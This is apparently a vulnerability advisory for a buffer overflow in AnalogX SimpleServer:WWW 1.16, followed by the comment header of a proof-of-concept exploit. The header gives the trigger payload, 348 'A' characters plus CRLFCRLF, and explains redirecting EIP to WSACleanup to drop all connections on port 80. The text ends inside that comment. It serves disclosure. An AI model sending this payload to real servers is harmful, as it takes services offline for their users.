Reportedly, version 1.16 of SimpleServer:WWW is prone to a buffer overflow vulnerability.

A remote attacker is able to connect to SimpleServer via telnet and makes an invalid request to the server. This will cause the web server to crash and potentially lead to a buffer overflow condition.

This issue was originally reported as a denial of service, however, it has been reported possible to initiate a buffer overflow condition.

/*
AnalogX SimpleServer 1.16 Proof-of-concept
	by Auriemma Luigi (e-mail: bugtest at sitoverde.com)

The minimum number of chars to send to the server is 348 'A's
plus "\r\n\r\n" ( = 352).

This is only a proof-of-concept, and the only thing that it do
is to close all the connections of the program http.exe

For do this I have decided to point the EIP to the WSACleanup
function, so all the connections on the port 80 will be killed
and nobody can connect to it.
If I send only 'A's the only connection that will be killed is
the same where the attack was launched, and until the program
is not closed it will continue to do its work, but if we call
WSACleanup is more useful!
